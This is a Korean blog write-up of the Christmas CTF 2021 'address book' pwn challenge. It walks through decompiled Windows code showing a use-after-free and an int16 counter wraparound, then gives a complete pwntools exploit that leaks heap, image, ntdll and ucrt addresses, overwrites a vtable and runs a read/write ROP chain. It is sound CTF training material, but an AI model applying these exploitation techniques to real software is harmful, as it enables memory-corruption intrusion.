---
title: Chrismas CTF address book write up
categories: [2021, Chrismas, new]
tags: [CTF, window , uaf , rop]
---

Chrismas CTF Oil system write up

이번 크리스마스 CTF 문제가 나쁘지 않다고 들어서 pwn문제를 기준으로 쭈욱 풀었다.

# analyze

  프로그램에 list가 두개가 있는데, address node 를 저장하는 list와 같은 address node를 저장하지만 휴지통 역할을 하는 list가 있다.
  address list에 있는 address node를 하나 지우면 휴지통 list로 넘어가게 된다.
  그리고 휴지통 list에 있는 address node를 다시 address list로 복구 할 수 있다.

``` c++
if ( *(_DWORD *)(*(_QWORD *)(unknown_libname_22((__int64)addressList) + 0x220) + 0x240i64) <= (signed int)index )
      {
        v6 = findNode(recycleList, v5, index);
        if ( v6 )
        {
          *(_QWORD *)(tempNode + 0x228) = v6;
          *(_QWORD *)(tempNode + 0x230) = *(_QWORD *)(v6 + 0x230);
          *(_QWORD *)(*(_QWORD *)(v6 + 0x230) + 0x228i64) = tempNode;
          *(_QWORD *)(v6 + 0x230) = tempNode;
        }
        else
        {
          *(_QWORD *)(*(_QWORD *)(unknown_libname_22((__int64)addressList) + 0x228) + 0x228i64) = tempNode;
          *(_QWORD *)(tempNode + 0x230) = *(_QWORD *)(unknown_libname_22((__int64)addressList) + 0x228);
          *(_QWORD *)(unknown_libname_22((__int64)addressList) + 0x228) = tempNode;
        }
        v9 = (_DWORD *)(unknown_libname_22((__int64)addressList) + 0x230);
        ++*v9;
        addressListFree(addressList);
        result = tempNode;
      }
```

  
   위 함수는 휴지통에 있는 list를 다시 복구시키는 함수이다.
   tempNode가 복구시킬 Node이다. if문이 아닌 else문 쪽을 보면 tempNode + 0x228은 초기화를 안한다.
   따라서 tempNode + 0x228은 휴지통 list에 있는 값이 유지되면서 들어간다.

# solve

``` c++
if ( a2 && a3 )
  {
    rax4 = sub_18002180(std::cout, (__int64)"======Address [");
    rax4a = std::ostream::operator<<(rax4, *(unsigned int *)(a2 + 0x240));
    rax4b = sub_18002180(rax4a, (__int64)"]======");
    std::ostream::operator<<(rax4b, sub_18002530);
    sub_18001070("Name : %s\n", (const char *)a2);
    sub_18001070("Address : %s\n", (const char *)(a2 + 0x10));
    sub_18001070("City : %s\n", (const char *)(a2 + 0x210));
    rax4c = (void **)sub_18003900(var20, a1);   // a1 += 10
    sub_18002DC0(rax4c, *(_QWORD *)(a2 + 0x228), a3 - 1);
    addressListFree(a1);
  }
```

``` c++
void __fastcall addressListFree(void **a1)
{
  _QWORD arg0; // [rsp+40h] [rbp+8h]

  *(_WORD *)a1[1] -= 10;
  if ( *(__int16 *)a1[1] < 10 )
  {
    sub_18001070("Address Book list saved in %p\n", *a1);
    j_j_free(*a1);
    j_j_free(a1[1]);
  }
}
```   

   list내용을 출력해주는 함수이다. 왜 있는지 모르겠는 a1이 10보다 작으면 free가 되는데, 이는 리스트를 출력시킬때마다 += 10씩 올라간다.  
   a1과 10을 검사 할때 int_16으로 검사를 하기 때문에 3275번이 넘어가면 실행시킬 수 있다.!  
   address Node를 만들수 있는 개수는 정해져 있기 때문에 취약점을 이용하여 List를 망가뜨려 반복적으로 만든 다음 실행 시키면 된다.  
   심지어 친절하게 힙 주소도 알려 준다.  


   위 취약점을 이용하면 vtable를 덮을 수 있고, list의 포인터 또한 덮을 수 있기때문에 릭도 가능하다!
   나머진 ROP를 이용하면 끝(open이 미리 되어있기때문에 read, write만 사용하면 된다.)


# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

def menu(index):
    s.recvuntil("> \x0d\x0a")
    s.sendline(str(index))

def Addaddress(name, address, city):
    menu(1)
    s.recvuntil("Name :")
    s.sendline(str(name))
    s.recvuntil("Address : ")
    s.sendline(str(address))
    s.recvuntil("City : ")
    s.sendline(city)

def deleteAddress(index):
    menu(3)
    s.recvuntil("> ")
    s.sendline(str(index))

def restoreAddress(index):
    menu(4)
    s.recvuntil("> ")
    s.sendline(str(index))

def infoAddress(index):
    menu(2)
    s.recvuntil("> ")
    s.sendline(str(index))

def modifyAddress(index, index2, payload):
    menu(5)
    s.recvuntil("> ")
    s.sendline(str(index))
    menu(index2)
    s.recvuntil(": ")
    s.sendline(payload)
    menu(4)

if __name__ == "__main__":
    s = remote("10.211.55.9", 7777)
    raw_input()

    s.recvuntil("> \x0d\x0a")
    s.sendline(str("powerprove")) # name

    Addaddress("AAA", 123, "123")
    Addaddress("BBB", 123, "123")
    Addaddress("CCC", 123, "123")

    deleteAddress(1)
    deleteAddress(2)
    deleteAddress(3)

    restoreAddress(2)
    restoreAddress(3)

    infoAddress(3275)

    s.recvuntil("saved in ")
    heap_addr = int(s.recvuntil("\x0d\x0a")[:-2], 16)
    log.info("heap_addr         : " +str(hex(heap_addr)))

    Addaddress("AAAAAAAABBBBBB", "D"*20, b"A"*0x10 + p64(heap_addr - 0x270))
    infoAddress(1)
    s.recvuntil("Name : ")
    image_base = u64(s.recvuntil("\x0d\x0a")[:-2].ljust(8, b"\x00")) - 0x6390
    log.info("image_base        : " + str(hex(image_base)))

    modifyAddress(-1, 3, b"A"*0x10 + p64(image_base + 0x6060))
    infoAddress(1)
    s.recvuntil("Name : ")
    ntdll_base = u64(s.recvuntil("\x0d\x0a")[:-2].ljust(8, b"\x00")) - 0x73E70
    log.info("ntdll_base        : " + str(hex(ntdll_base)))

    modifyAddress(-1, 3, b"A"*0x10 + p64(image_base + 0x61e8))
    infoAddress(1)
    s.recvuntil("Name : ")
    ucrt_base = u64(s.recvuntil("\x0d\x0a")[:-2].ljust(8, b"\x00")) - 0x673E0
    log.info("ucrt_base         : " + str(hex(ucrt_base)))

    modifyAddress(-1, 1, p64(heap_addr) + p64(ntdll_base + 0xa1364))

    payload = b"A"*0x88
    payload += p64(heap_addr + 0x100)
    payload += b"B"*0x58
    payload += p64(ntdll_base + 0x8cab0)
    payload += p64(heap_addr + 0x300)
    payload += p64(3)
    payload += p64(0x100)
    payload += b"AAAAAAAA"*3
    payload += p64(ucrt_base + 0x7B30) # read
    payload += p64(ntdll_base + 0x25686)
    payload += p64(0xdeadbeaf)*5
    payload += p64(ntdll_base + 0x8cab0)
    payload += p64(heap_addr + 0x300)
    payload += p64(1)
    payload += p64(0x100)
    payload += b"AAAAAAAA"*3
    payload += p64(ucrt_base + 0x86A0) # write
    payload += b"CCCCCCCC"

    modifyAddress(-1, 2, payload)

    menu(6)
    s.sendlineafter(">", str(1))
    s.interactive()
```
